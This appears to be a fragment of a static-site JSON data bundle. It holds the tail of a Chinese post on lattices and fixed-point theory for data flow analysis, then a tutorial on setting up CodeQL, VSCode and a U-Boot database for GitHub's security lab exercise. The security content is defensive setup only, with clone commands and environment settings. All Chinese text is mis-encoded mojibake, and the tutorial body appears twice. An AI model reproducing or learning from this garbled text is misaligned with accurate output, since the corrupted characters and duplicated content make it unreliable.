¼l1=(p1,<=1),l2=(p2,<=2)...ln=(pn,<=n),å¦ææ¯ä¸ä¸ªlatticeé½å­å¨ä¸ä¸ªæå°ä¸çåæå¤§ä¸çãåæä»¬å¯ä»¥å®ä¹ä¸ä¸ªproduct lattice ln = (p,<=)ï¼\n\n * p = p1 x ... x pn\n * (x1,...,xn) <= (y1,...,yn) <=> (x1 <= y1)ä¸...ä¸(xn <= yn)\n * (x1,...,xn) , (y1,...,yn)çæå°ä¸ç = (x1åy1çæå°ä¸ç,...,xnåynçæå°ä¸ç)\n * (x1,...,xn) , (y1,...,yn)çæå¤§ä¸ç = (x1åy1çæå¤§ä¸ç,...,xnåynçæå¤§ä¸ç)\n\næ§è´¨ï¼\n\n * ä¸ä¸ªproduct latticeæ¯ä¸ä¸ªlattice\n * ä¸ä¸ªproduct lattice lä¸­çæ¯ä¸ä¸ªlatticeé½æ¯completeï¼é£ä¹lä¹æ¯completeã\n\n\n# data flow analysis framework via lattice\n\næäºä¸é¢ççè®ºåºç¡ï¼å°±å¯ä»¥å©ç¨çè®ºåºç¡è¿è¡data flow analysisäºã\n\n\n\ndata flow analysisçåºæ¬æ¡æ¶ç±ä»¥ä¸ä¸ä¸ªåç´ ææï¼\n\n * dï¼æ°æ®æµçèæ¹åï¼forwardsè¿æ¯backwards\n * lï¼ä¸ä¸ªæ ¼åå«å¼åvåæä½ç¬¦ join or meet\n * fï¼transfer functions\n\næ å­ï¼\n\n\n\nå¨latticeä¸ä¸æ­å°ä½¿ç¨meetæèjoinï¼åå©transfer functionsè¿è¡è¿­ä»£ã\n\nåå°ä¸é¢æåºçé®é¢ï¼\n\n * å¯¹äºä¸ä¸ªæ®éçç®æ³ï¼å®è½ååï¼ä¸å®å¯ä»¥è¾¾å°ä¸ä¸ªä¸å¨ç¹åï¼ä¸å®ä¼è¾åºä¸ä¸ªç»æåï¼\n   \n   * latticeå½æ°çåè°æ§é®é¢\n\n * å¦æè½è¾¾å°ä¸å¨ç¹ï¼ä¸å®åªæä¸ä¸ªåï¼å¦æä¸æ­¢ä¸ä¸ªï¼é£ä¹æä»¬å¾åºçè¿ä¸ªä¸å¨ç¹æ¯æç²¾ç¡®çåï¼\n   \n   * å¯ä»¥ï¼x=f(x)\n   \n   \n   \n   * å½æ°åè°æ§ï¼ä¸å¨ç¹å®çã\n\n * å¦æè½è¾¾å°ä¸å¨ç¹ï¼é£ä¹æä»¬æåæåµä¸è½å¤å¾å°ç»æï¼\n\n\n# monotonicity and fixed point theorem - å½æ°åè°æ§åä¸å¨ç¹å®ç\n\n\n# å½æ°åè°æ§\n\n\n\nä¸ä¸ªfunction f: l -> l(læ¯ä¸ä¸ªlattice)ï¼å¦æå½æ°fæ¯åè°çï¼é£ä¹ä»»æçx,yå±äºlï¼å¦æx<=y => f(x) <= f(y)\n\n\n# ä¸å¨ç¹å®ç\n\n\n\nç»å®ä¸ä¸ªå¨æ ¼(l,<=),å¦ææ»¡è¶³å¦ä¸ç»è®ºï¼\n\n 1. f: l -> l æ¯åè°ç\n 2. læ¯æç©·ç\n\né£ä¹ï¼æä»¬è½æ±å¾fçæå°ä¸å¨ç¹ï¼éè¿è¿­ä»£f(bottom),f(f(bottom)),...,fk(bottom)ç´å°è¾¾å°ä¸ä¸ªä¸å¨ç¹ï¼è¯¥ä¸å¨ç¹å°±æ¯æå°ä¸å¨ç¹ãæå¤§ä¸å¨ç¹æ¯éè¿è¿­ä»£f(top),f(f(top)),...,fk(top)ç´å°è¾¾å°ä¸ä¸ªä¸å¨ç¹ï¼è¯¥ä¸å¨ç¹å°±æ¯æå¤§ä¸å¨ç¹ã\n\nå­å¨ä¸å¨ç¹è¯æï¼\n\n\n\næå°ä¸å¨ç¹è¯æï¼\n\n\n\n\n\n\n# relate iterative algorithm to fixed point theorem - è¿­ä»£ç®æ³è½¬åä¸ºä¸å¨ç¹å®ç\n\n\n# may/must analysis, a lattice view\n\n\n# distributivity and mop\n\n\n# constant propagation\n\n\n# work-list algorithm",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼",frontmatter:{title:"CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼",date:"2022-04-03T00:00:00.000Z",permalink:"/sec/sa/codeql/uboot1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","CodeQL"],tags:["CodeQL"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2001.CodeQL/00.%20CodeQL%20-%20UBoot%E7%BB%83%E4%B9%A0%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%8A%EF%BC%89.html",relativePath:"02.å®å¨/200.éæåæ/2001.CodeQL/00. CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼.md",key:"v-34d8b340",path:"/sec/sa/codeql/uboot1/",headers:[{level:2,title:"0. åå»ºé¡¹ç®",slug:"_0-åå»ºé¡¹ç®",normalizedTitle:"0. åå»ºé¡¹ç®",charIndex:306},{level:3,title:"1. æ¬¢è¿æ¥å°è¯¾ç¨",slug:"_1-æ¬¢è¿æ¥å°è¯¾ç¨",normalizedTitle:"1. æ¬¢è¿æ¥å°è¯¾ç¨",charIndex:540},{level:2,title:"2. è®¾ç½®IDEç¯å¢",slug:"_2-è®¾ç½®ideç¯å¢",normalizedTitle:"2. è®¾ç½®ideç¯å¢",charIndex:771},{level:3,title:"1. å¯ç¨Github Actions",slug:"_1-å¯ç¨github-actions",normalizedTitle:"1. å¯ç¨github actions",charIndex:848},{level:3,title:"2. å®è£VSCode",slug:"_2-å®è£vscode",normalizedTitle:"2. å®è£vscode",charIndex:937},{level:3,title:"3. ä¸è½½CodeQL starter",slug:"_3-ä¸è½½codeql-starter",normalizedTitle:"3. ä¸è½½codeql starter",charIndex:1049},{level:3,title:"4. ä¸è½½U-Boot CodeQLæ°æ®åº",slug:"_4-ä¸è½½u-boot-codeqlæ°æ®åº",normalizedTitle:"4. ä¸è½½u-boot codeqlæ°æ®åº",charIndex:1389},{level:3,title:"5. å¯¼å¥æ°æ®åº",slug:"_5-å¯¼å¥æ°æ®åº",normalizedTitle:"5. å¯¼å¥æ°æ®åº",charIndex:1583}],excerpt:'<h1 id="codeql-ubootç»ä¹ é¡¹ç®-ä¸"><a class="header-anchor" href="#codeql-ubootç»ä¹ é¡¹ç®-ä¸">#</a> CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼</h1>\n<p>CodeQLæ¯ç±Githubå®å¨å®éªå®¤æ¨åºçä¸æ¬¾ç¨äºèªå¨åä»£ç å®å¨æ£æ¥çå¼æï¼éè¿è¯¥åºç¨å¸®å©å®å¨ç ç©¶èåç°åææç¨åºä¸­æ½å¨çå¨èåæ¼æ´ï¼æ¹ä¾¿å¯¹ç¨åºæé¢ä¸´çå¨èè¿è¡åæãCodeQLå°éè¦åæçä»£ç æåä¿å­å°æ°æ®åºä¸­ï¼ç¶åä½¿ç¨ç±»SQLçæ¥è¯¢è¯­å¥æ¥è¯¢æ°æ®åºï¼åç°ç¨åºä¸­çBugåå®å¨æ¼æ´ã</p>\n',headersStr:"0. åå»ºé¡¹ç® 1. æ¬¢è¿æ¥å°è¯¾ç¨ 2. è®¾ç½®IDEç¯å¢ 1. å¯ç¨Github Actions 2. å®è£VSCode 3. ä¸è½½CodeQL starter 4. ä¸è½½U-Boot CodeQLæ°æ®åº 5. å¯¼å¥æ°æ®åº",content:"# CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼\n\nCodeQLæ¯ç±Githubå®å¨å®éªå®¤æ¨åºçä¸æ¬¾ç¨äºèªå¨åä»£ç å®å¨æ£æ¥çå¼æï¼éè¿è¯¥åºç¨å¸®å©å®å¨ç ç©¶èåç°åææç¨åºä¸­æ½å¨çå¨èåæ¼æ´ï¼æ¹ä¾¿å¯¹ç¨åºæé¢ä¸´çå¨èè¿è¡åæãCodeQLå°éè¦åæçä»£ç æåä¿å­å°æ°æ®åºä¸­ï¼ç¶åä½¿ç¨ç±»SQLçæ¥è¯¢è¯­å¥æ¥è¯¢æ°æ®åºï¼åç°ç¨åºä¸­çBugåå®å¨æ¼æ´ã\n\nGithubå®éªå®¤ä¸­æä¾äºä¸ä¸ªç»ä¹ çé¡¹ç®ï¼æ¹ä¾¿ä»å¥é¨ç¯å¢æ­å»ºå¼å§ä¸æ­¥ä¸æ­¥çæCodeQLè¯­æ³ï¼é¡¹ç®ä½¿ç¨çæ¯C/C++çè¯­è¨ï¼å®¡è®¡çé¡¹ç®æ¯U-Bootã\n\nè¿ä¸ç¯æç« åæ¬Ubooté¡¹ç®çå¼å§åCodeQLçç¯å¢æ­å»ºï¼å¯¹åºäºCodeQL-UBooté¡¹ç®çç¬¬1ã2ä¸¤è¯¾ã\n\n\n# 0. åå»ºé¡¹ç®\n\né¡¹ç®å°åï¼https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)\n\n\n\nç¬¬ä¸æ¬¡ä½¿ç¨Githubçlabåè½éè¦åè¿è¡ææï¼ææå®æä¹åï¼å¯åæ¬¡ç¹å»Start Free courseã\n\n\n\nç¹å»ç»¿è²æé®ï¼è¿å¥å°é¡¹ç®ä¸­ãè¯¥é¡¹ç®å¨ä½ çGitHubä¸­åå»ºäºä¸ä¸ªå¬å¼çä»åºï¼å¹¶éåGithub Actionsï¼å½ä»£ç æäº¤åï¼èªå¨è§¦åæ£æµï¼å¤æ­ä½ åçä»£ç æ¯å¦æ­£ç¡®ã\n\n\n\n\n# 1. æ¬¢è¿æ¥å°è¯¾ç¨\n\nç¬¬ä¸è¯¾æ¯å¯¹æ´ä¸ªç»ä¹ é¡¹ç®çä¸ä¸ªæ¦æ¬åå¯¼å¥ãè¯¥è¯¾ç¨çç®æ æ¯å¨ U-Boot å¼å¯¼å è½½ç¨åºä¸­æ¾å°ä¸ç» 9 ä¸ªè¿ç¨ä»£ç æ§è¡æ¼æ´ãè¿äºæ¼æ´æåæ¯ç± GitHub å®å¨å®éªå®¤ç ç©¶äººååç°çï¼å¹¶å·²å¾å°ä¿®å¤ãå¹¶ä¸ç»åºäºç¸åºçå¸®å©ææ¡£ï¼è¿äºå¸®å©ææ¡£å¨è¿ä¸ç¯æåçåèèµæä¸­ä¹æç»åºã\n\nå¨çå®ç¸å³çç®ä»ä¹åï¼ç¹å»è¯è®ºåºä¸é¢çClose issueå³å¯å³é­å½åé®é¢ãå³é­é®é¢ä¹åï¼github- learning-labçè¯è®ºä¸­ä¼æä¸ä¸æ­¥çé¾æ¥ã\n\n\n\n\n# 2. è®¾ç½®IDEç¯å¢\n\nè¿ä¸èææä»¬å¦ä½è®¾ç½®ä¸ä¸ªCodeQLçç¯å¢ãä½¿ç¨CodeQLçVSCodeæå±å®æä»£ç è¡¥å¨ãä¸ä¸æå¸®å©ç­IDEç¸å³åè½ã\n\n\n# 1. å¯ç¨Github Actions\n\nè¿ä¸æ­¥åCodeQLç¯å¢æ­å»ºæ å³ï¼åªæ¯ä¸ºäºåé¢æ´å¥½çç»§ç»­æ´ä¸ªè¯¾ç¨ãå¼å¯çæ¹æ³å¾ç®åï¼åªéè¦ç¹å»é¾æ¥ï¼ç¶åç¹å»å¯ç¨æé®å³å¯ã\n\n\n\n\n# 2. å®è£VSCode\n\nVSCodeæ¯å¾®è½¯å¼åçä¸æ¬¾ååå¥½ç¨çææ¬ç¼è¾å·¥å·ãä¸è½½å°åå¦ä¸ï¼\n\nhttps://code.visualstudio.com/Download\n\nç¸å³çå®è£ãéç½®è¯·åèç½ä¸çå¶ä»èµæã\n\n\n# 3. ä¸è½½CodeQL starter\n\næ ¹æ®ç»åºçé¾æ¥ï¼è·³è½¬å°vscode-codeql-starterä¸è½½é¡µé¢ï¼æç§é¡µé¢çå¸®å©å®æè®¾ç½®ã\n\n# 3.1 å®è£VSCode\n\n# 3.2 å®è£VSCodeçCodeQLæä»¶\n\næä»¶å®è£å°åï¼https://marketplace.visualstudio.com/items?itemName=github.vscode-codeql\n\nä¹å¯ä»¥å¨VSCodeçæä»¶åºä¸­æç´¢CodeQLæä»¶\n\n\n\n# 3.3 å°å½åçä»åºåéå°æ¬å°\n\n git clone --recursive git@github.com:github/vscode-codeql-starter.git\n\n\n1\n\n\nVSCodeæå¼åéçé¡¹ç®ã\n\n\n\n\n# 4. ä¸è½½U-Boot CodeQLæ°æ®åº\n\nä¸è½½å°åï¼https://downloads.lgtm.com/snapshots/cpp/uboot/u-boot_u-boot_cpp-srcVersion_d0d07ba86afc8074d79e436b1ba4478fa0f0c1b5-dist_odasa-2019-07-25-linux64.zip\n\nä¸è½½å®æåï¼è§£åã\n\n\n# 5. å¯¼å¥æ°æ®åº\n\nä½¿ç¨CodeQLçVSCodeæä»¶å¯¼å¥æ°æ®åºï¼è¿ä¸ªæ°æ®åºæ¯åç»­çè¯¾ç¨ä¸­æ¥è¯¢çä¸ä¸ªåºç¡ã\n\næ³¨æï¼å¨ç¹å»äºCodeQLæä»¶ä¹åï¼è¯¥æä»¶ä¼èªå¨å¸®æä»¬ä¸è½½CodeQL CLIï¼ä¸è½½éåº¦è¾æ¢ï¼è¿éæä»¬ä½¿ç¨èªå·±ä¸è½½åéç½®çCodeQL CLIã\n\n\n\næä»¬åå³é­ VSCodeï¼ç¶åå»ä¸è½½åéç½®CodeQL CLIã\n\n 1. å¨å¦ä¸å°åä¸­ï¼ä¸è½½å¯¹åºçæ¬çCodeQL CLIï¼https://github.com/github/codeql-cli-binaries/releases\n\n 2. åå»ºä¸ä¸ªç®å½ç¨äºå­æ¾ä¸è½½çCodeQLï¼æè¿éå½åä¸ºcodeql_homeï¼å¹¶å°ä¸è½½çæä»¶è§£åå°è¯¥æä»¶å¤¹ä¸ã\n\n 3. ä¹åéè¦å»è·åCodeQLä»åº çæ¬å°å¯æ¬ãå ä¸ºè¿ä¸ªä»åºåæä»¬ä¸è½½çåç¼©æä»¶è§£ååçæä»¶åä¸æ ·ï¼æä»¥è¿ä¸æ­¥æä»¬å¨cloneçæ¶åéè¦éå½åä¸ä¸ã\n\ngit clone git@github.com:github/codeql.git codeql-repo\n\n\n1\n\n\n 4. Goè¯­è¨åæä½¿ç¨çåºæä»¶åæ¥è¯¢æä»¶å¨å¦ä¸ä¸ªç¬ç«çä»åºCodeQL for Go repositoryä¸­ï¼ä¹æå®åéå°codeql-homeä¸­ã\n    \n    ä¸¤ä¸ªä»åºåºè¯¥æåå¼çå³ç³»ãæ¯å¦ï¼å¦æCodeQLä»åºçè·¯å¾æ¯$HOME/codeql-home/codeql-repoï¼é£ä¹CodeQL for Goçæ ¹ç®å½å°±åºè¯¥æ¯$HOME/codeql-home/codeql-goã\n\n 5. æµè¯CodeQL CLIè½å¦æ­£å¸¸ä½¿ç¨\n    \n    CodeQL CLIæä¸äºå­å½ä»¤å¯ä»¥æ§è¡ãæ§è¡è¿äºå­å½ä»¤å¯ä»¥å¸®å©å¤æ­ä½ ææ²¡ææ­£ç¡®çéç½®ååå»ºæ°æ®åºï¼\n    \n    * codeql resolve languageså½ä»¤ä¼åä¸¾åºæ¯æåªäºè¯­è¨çæ¯æåå»ºæ°æ®åºã\n    * codeql resolve qlpackså½ä»¤ä¼åä¸¾åºCLIå¯ä»¥æ¾å°çQL packsãè¿æ¡å½ä»¤ä¼åä¸¾åºCodeQLä»åºï¼codeql-cpp, codeql-csharp, codeql-go, codeql-java, codeql-javascript, å codeql-pythonï¼ä¸­QL packsçåå­ãCodeQLä»åºä¸­ä¹åå«äºupgradeåålegacyåãå½æ¨æ³è¦åçº§æ°æ®åºï¼ä»¥ä¾¿è½å¤ä½¿ç¨æ°çæ¬çCodeQLå·¥å·é¾(èä¸æ¯ç¨äºåå»ºæ°æ®åºçCodeQLå·¥å·é¾)åææ°æ®åºæ¶ï¼CLIä¼ä½¿ç¨åçº§åãlegacyåç¡®ä¿ä½¿ç¨æ§äº§ååå»ºçèªå®ä¹æ¥è¯¢ååºä¸æ¨çCodeQLçæ¬å¼å®¹ã\n\n\n\n 6. å°CodeQL CLIæ·»å å°ç¯å¢åéä¸­ã\n    \n    vim ~/.zshrc\n    # æ·»å å¦ä¸å è¡\n    # CODEQL_HOME\n    export CODEQL_HOME=~/Workspace/ProgramAnalysis/codeql_home\n    export PATH=$PATH:$CODEQL_HOME/codeql\n    \n    source ~/.zshrc\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n    \n    Windows æ·»å ç¯å¢åéçæ¹å¼è¯·åèå¶ä»æç« ã\n\n 7. æµè¯ç¯å¢åéæ¯å¦ææ\n    \n    \n\n 8. å½æä»¬éç½®äºç¯å¢åéåï¼VSCodeä¼èªå¨è¯å«å¹¶ä½¿ç¨æä»¬èªå·±çCodeQL CLI\n\nä¹åæä»¬ç»§ç»­å°æä»¬ä¸è½½çæ°æ®åºå¯¼å¥ã\n\nç¹å»CodeQLæä»¶ï¼éæ©From a folderéæ©ä»æä»¶å¤¹ä¸­å¯¼å¥ã\n\n\n\nä¹åï¼éæ©æä»¬ä¸è½½çæ°æ®åºè§£ååçæä»¶å¤¹ãå¯¼å¥ä¹åå¨DataBasesä¸­å°±æäºUBootçæ°æ®åºäºã\n\n\n\n# 6. åéç»ä¹ é¡¹ç®å°æ¬å°å¹¶å å¥starter\n\nåéä½ èªå·±githubä»åºä¸­çé¡¹ç®å°æ¬å°ã\n\ngit clone git@github.com:p0josec/codeql-uboot.git\n\n\n1\n\n\nå¨VSCodeä¸­å°æä»¶å¤¹æ·»å å°starteré¡¹ç®ä¸­ã\n\n\n\næ·»å å®æåï¼å¨starteré¡¹ç®ä¸­ä¼ææä»¬æ·»å çé¡¹ç®ï¼ä»¥åå°±å¯ä»¥å¨VSCodeä¸­å®æç¸å³çä»£ç ç¼åäºã\n\n\n\nå°è¿éï¼è¿ä¸è¯¾å°±ç»æäºï¼æä»¬å¯ä»¥åä¸ä¸è¯¾ä¸æ ·ï¼ç¹å»close issueï¼å³é­å½åè¯¾ç¨ï¼å¹¶æ ¹æ®æºå¨äººçæç¤ºï¼è¿å¥ä¸ä¸è¯¾ã\n\n----------------------------------------\n\nå¦æå®å¨ä»ç»å®Ubootç»ä¹ é¡¹ç®çå¨é¨10è¯¾çåå®¹ï¼ç¯å¹ä¼è¿é¿ï¼å©ä¸çåå®¹ä»¥ååæ´æ°ãè¿ä¸ç¯å°±åå°è¿éå¦ã\n\nä¸é¢æ¯è¿ä¸ç¯çåèèµæï¼\n\nCodeQL Github\n\nCodeQL-Cli Github\n\nCodeQL-VSCode Github\n\nLGTM.COM\n\nCodeQL å®ç½",normalizedContent:"# codeql - ubootç»ä¹ é¡¹ç®ï¼ä¸ï¼\n\ncodeqlæ¯ç±githubå®å¨å®éªå®¤æ¨åºçä¸æ¬¾ç¨äºèªå¨åä»£ç å®å¨æ£æ¥çå¼æï¼éè¿è¯¥åºç¨å¸®å©å®å¨ç ç©¶èåç°åææç¨åºä¸­æ½å¨çå¨èåæ¼æ´ï¼æ¹ä¾¿å¯¹ç¨åºæé¢ä¸´çå¨èè¿è¡åæãcodeqlå°éè¦åæçä»£ç æåä¿å­å°æ°æ®åºä¸­ï¼ç¶åä½¿ç¨ç±»sqlçæ¥è¯¢è¯­å¥æ¥è¯¢æ°æ®åºï¼åç°ç¨åºä¸­çbugåå®å¨æ¼æ´ã\n\ngithubå®éªå®¤ä¸­æä¾äºä¸ä¸ªç»ä¹ çé¡¹ç®ï¼æ¹ä¾¿ä»å¥é¨ç¯å¢æ­å»ºå¼å§ä¸æ­¥ä¸æ­¥çæcodeqlè¯­æ³ï¼é¡¹ç®ä½¿ç¨çæ¯c/c++çè¯­è¨ï¼å®¡è®¡çé¡¹ç®æ¯u-bootã\n\nè¿ä¸ç¯æç« åæ¬ubooté¡¹ç®çå¼å§åcodeqlçç¯å¢æ­å»ºï¼å¯¹åºäºcodeql-ubooté¡¹ç®çç¬¬1ã2ä¸¤è¯¾ã\n\n\n# 0. åå»ºé¡¹ç®\n\né¡¹ç®å°åï¼https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)\n\n\n\nç¬¬ä¸æ¬¡ä½¿ç¨githubçlabåè½éè¦åè¿è¡ææï¼ææå®æä¹åï¼å¯åæ¬¡ç¹å»start free courseã\n\n\n\nç¹å»ç»¿è²æé®ï¼è¿å¥å°é¡¹ç®ä¸­ãè¯¥é¡¹ç®å¨ä½ çgithubä¸­åå»ºäºä¸ä¸ªå¬å¼çä»åºï¼å¹¶éågithub actionsï¼å½ä»£ç æäº¤åï¼èªå¨è§¦åæ£æµï¼å¤æ­ä½ åçä»£ç æ¯å¦æ­£ç¡®ã\n\n\n\n\n# 1. æ¬¢è¿æ¥å°è¯¾ç¨\n\nç¬¬ä¸è¯¾æ¯å¯¹æ´ä¸ªç»ä¹ é¡¹ç®çä¸ä¸ªæ¦æ¬åå¯¼å¥ãè¯¥è¯¾ç¨çç®æ æ¯å¨ u-boot å¼å¯¼å è½½ç¨åºä¸­æ¾å°ä¸ç» 9 ä¸ªè¿ç¨ä»£ç æ§è¡æ¼æ´ãè¿äºæ¼æ´æåæ¯ç± github å®å¨å®éªå®¤ç ç©¶äººååç°çï¼å¹¶å·²å¾å°ä¿®å¤ãå¹¶ä¸ç»åºäºç¸åºçå¸®å©ææ¡£ï¼è¿äºå¸®å©ææ¡£å¨è¿ä¸ç¯æåçåèèµæä¸­ä¹æç»åºã\n\nå¨çå®ç¸å³çç®ä»ä¹åï¼ç¹å»è¯è®ºåºä¸é¢çclose issueå³å¯å³é­å½åé®é¢ãå³é­é®é¢ä¹åï¼github- learning-labçè¯è®ºä¸­ä¼æä¸ä¸æ­¥çé¾æ¥ã\n\n\n\n\n# 2. è®¾ç½®ideç¯å¢\n\nè¿ä¸èææä»¬å¦ä½è®¾ç½®ä¸ä¸ªcodeqlçç¯å¢ãä½¿ç¨codeqlçvscodeæå±å®æä»£ç è¡¥å¨ãä¸ä¸æå¸®å©ç­ideç¸å³åè½ã\n\n\n# 1. å¯ç¨github actions\n\nè¿ä¸æ­¥åcodeqlç¯å¢æ­å»ºæ å³ï¼åªæ¯ä¸ºäºåé¢æ´å¥½çç»§ç»­æ´ä¸ªè¯¾ç¨ãå¼å¯çæ¹æ³å¾ç®åï¼åªéè¦ç¹å»é¾æ¥ï¼ç¶åç¹å»å¯ç¨æé®å³å¯ã\n\n\n\n\n# 2. å®è£vscode\n\nvscodeæ¯å¾®è½¯å¼åçä¸æ¬¾ååå¥½ç¨çææ¬ç¼è¾å·¥å·ãä¸è½½å°åå¦ä¸ï¼\n\nhttps://code.visualstudio.com/download\n\nç¸å³çå®è£ãéç½®è¯·åèç½ä¸çå¶ä»èµæã\n\n\n# 3. ä¸è½½codeql starter\n\næ ¹æ®ç»åºçé¾æ¥ï¼è·³è½¬å°vscode-codeql-starterä¸è½½é¡µé¢ï¼æç§é¡µé¢çå¸®å©å®æè®¾ç½®ã\n\n# 3.1 å®è£vscode\n\n# 3.2 å®è£vscodeçcodeqlæä»¶\n\næä»¶å®è£å°åï¼https://marketplace.visualstudio.com/items?itemname=github.vscode-codeql\n\nä¹å¯ä»¥å¨vscodeçæä»¶åºä¸­æç´¢codeqlæä»¶\n\n\n\n# 3.3 å°å½åçä»åºåéå°æ¬å°\n\n git clone --recursive git@github.com:github/vscode-codeql-starter.git\n\n\n1\n\n\nvscodeæå¼åéçé¡¹ç®ã\n\n\n\n\n# 4. ä¸è½½u-boot codeqlæ°æ®åº\n\nä¸è½½å°åï¼https://downloads.lgtm.com/snapshots/cpp/uboot/u-boot_u-boot_cpp-srcversion_d0d07ba86afc8074d79e436b1ba4478fa0f0c1b5-dist_odasa-2019-07-25-linux64.zip\n\nä¸è½½å®æåï¼è§£åã\n\n\n# 5. å¯¼å¥æ°æ®åº\n\nä½¿ç¨codeqlçvscodeæä»¶å¯¼å¥æ°æ®åºï¼è¿ä¸ªæ°æ®åºæ¯åç»­çè¯¾ç¨ä¸­æ¥è¯¢çä¸ä¸ªåºç¡ã\n\næ³¨æï¼å¨ç¹å»äºcodeqlæä»¶ä¹åï¼è¯¥æä»¶ä¼èªå¨å¸®æä»¬ä¸è½½codeql cliï¼ä¸è½½éåº¦è¾æ¢ï¼è¿éæä»¬ä½¿ç¨èªå·±ä¸è½½åéç½®çcodeql cliã\n\n\n\næä»¬åå³é­ vscodeï¼ç¶åå»ä¸è½½åéç½®codeql cliã\n\n 1. å¨å¦ä¸å°åä¸­ï¼ä¸è½½å¯¹åºçæ¬çcodeql cliï¼https://github.com/github/codeql-cli-binaries/releases\n\n 2. åå»ºä¸ä¸ªç®å½ç¨äºå­æ¾ä¸è½½çcodeqlï¼æè¿éå½åä¸ºcodeql_homeï¼å¹¶å°ä¸è½½çæä»¶è§£åå°è¯¥æä»¶å¤¹ä¸ã\n\n 3. ä¹åéè¦å»è·åcodeqlä»åº çæ¬å°å¯æ¬ãå ä¸ºè¿ä¸ªä»åºåæä»¬ä¸è½½çåç¼©æä»¶è§£ååçæä»¶åä¸æ ·ï¼æä»¥è¿ä¸æ­¥æä»¬å¨cloneçæ¶åéè¦éå½åä¸ä¸ã\n\ngit clone git@github.com:github/codeql.git codeql-repo\n\n\n1\n\n\n 4. goè¯­è¨åæä½¿ç¨çåºæä»¶åæ¥è¯¢æä»¶å¨å¦ä¸ä¸ªç¬ç«çä»åºcodeql for go repositoryä¸­ï¼ä¹æå®åéå°codeql-homeä¸­ã\n    \n    ä¸¤ä¸ªä»åºåºè¯¥æåå¼çå³ç³»ãæ¯å¦ï¼å¦æcodeqlä»åºçè·¯å¾æ¯$home/codeql-home/codeql-repoï¼é£ä¹codeql for goçæ ¹ç®å½å°±åºè¯¥æ¯$home/codeql-home/codeql-goã\n\n 5. æµè¯codeql cliè½å¦æ­£å¸¸ä½¿ç¨\n    \n    codeql cliæä¸äºå­å½ä»¤å¯ä»¥æ§è¡ãæ§è¡è¿äºå­å½ä»¤å¯ä»¥å¸®å©å¤æ­ä½ ææ²¡ææ­£ç¡®çéç½®ååå»ºæ°æ®åºï¼\n    \n    * codeql resolve languageså½ä»¤ä¼åä¸¾åºæ¯æåªäºè¯­è¨çæ¯æåå»ºæ°æ®åºã\n    * codeql resolve qlpackså½ä»¤ä¼åä¸¾åºcliå¯ä»¥æ¾å°çql packsãè¿æ¡å½ä»¤ä¼åä¸¾åºcodeqlä»åºï¼codeql-cpp, codeql-csharp, codeql-go, codeql-java, codeql-javascript, å codeql-pythonï¼ä¸­ql packsçåå­ãcodeqlä»åºä¸­ä¹åå«äºupgradeåålegacyåãå½æ¨æ³è¦åçº§æ°æ®åºï¼ä»¥ä¾¿è½å¤ä½¿ç¨æ°çæ¬çcodeqlå·¥å·é¾(èä¸æ¯ç¨äºåå»ºæ°æ®åºçcodeqlå·¥å·é¾)åææ°æ®åºæ¶ï¼cliä¼ä½¿ç¨åçº§åãlegacyåç¡®ä¿ä½¿ç¨æ§äº§ååå»ºçèªå®ä¹æ¥è¯¢ååºä¸æ¨çcodeqlçæ¬å¼å®¹ã\n\n\n\n 6. å°codeql cliæ·»å å°ç¯å¢åéä¸­ã\n    \n    vim ~/.zshrc\n    # æ·»å å¦ä¸å è¡\n    # codeql_home\n    export codeql_home=~/workspace/programanalysis/codeql_home\n    export path=$path:$codeql_home/codeql\n    \n    source ~/.zshrc\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n    \n    windows æ·»å ç¯å¢åéçæ¹å¼è¯·åèå¶ä»æç« ã\n\n 7. æµè¯ç¯å¢åéæ¯å¦ææ\n    \n    \n\n 8. å½æä»¬éç½®äºç¯å¢åéåï¼vscodeä¼èªå¨è¯å«å¹¶ä½¿ç¨æä»¬èªå·±çcodeql cli\n\nä¹åæä»¬ç»§ç»­å°æä»¬ä¸è½½çæ°æ®åºå¯¼å¥ã\n\nç¹å»codeqlæä»¶ï¼éæ©from a folderéæ©ä»æä»¶å¤¹ä¸­å¯¼å¥ã\n\n\n\nä¹åï¼éæ©æä»¬ä¸è½½çæ°æ®åºè§£ååçæä»¶å¤¹ãå¯¼å¥ä¹åå¨databasesä¸­å°±æäºubootçæ°æ®åºäºã\n\n\n\n# 6. åéç»ä¹ é¡¹ç®å°æ¬å°å¹¶å å¥starter\n\nåéä½ èªå·±githubä»åºä¸­çé¡¹ç®å°æ¬å°ã\n\ngit clone git@github.com:p0josec/codeql-uboot.git\n\n\n1\n\n\nå¨vscodeä¸­å°æä»¶å¤¹æ·»å å°starteré¡¹ç®ä¸­ã\n\n\n\næ·»å å®æåï¼å¨starteré¡¹ç®ä¸­ä¼ææä»¬æ·»å çé¡¹ç®ï¼ä»¥åå°±å¯ä»¥å¨vscodeä¸­å®æç¸å³çä»£ç ç¼åäºã\n\n\n\nå°è¿éï¼è¿ä¸è¯¾å°±ç»æäºï¼æä»¬å¯ä»¥åä¸ä¸è¯¾ä¸æ ·ï¼ç¹å»close issueï¼å³é­å½åè¯¾ç¨ï¼å¹¶æ ¹æ®æºå¨äººçæç¤ºï¼è¿å¥ä¸ä¸è¯¾ã\n\n----------------------------------------\n\nå¦æå®å¨ä»ç»å®ubootç»ä¹ é¡¹ç®çå¨é¨10è¯¾çåå®¹ï¼ç¯å¹ä¼è¿é¿ï¼å©ä¸çåå®¹ä»¥ååæ´æ°ãè¿ä¸ç¯å°±åå°è¿éå¦ã\n\nä¸é¢æ¯è¿ä¸ç¯çåèèµæï¼\n\ncodeql github\n\ncodeql-cli github\n\ncodeql-vscode github\n\nlgtm.com\n\ncodeql å®ç½",charsets:{cjk:!0},lastUpdated:"2022/04/04, 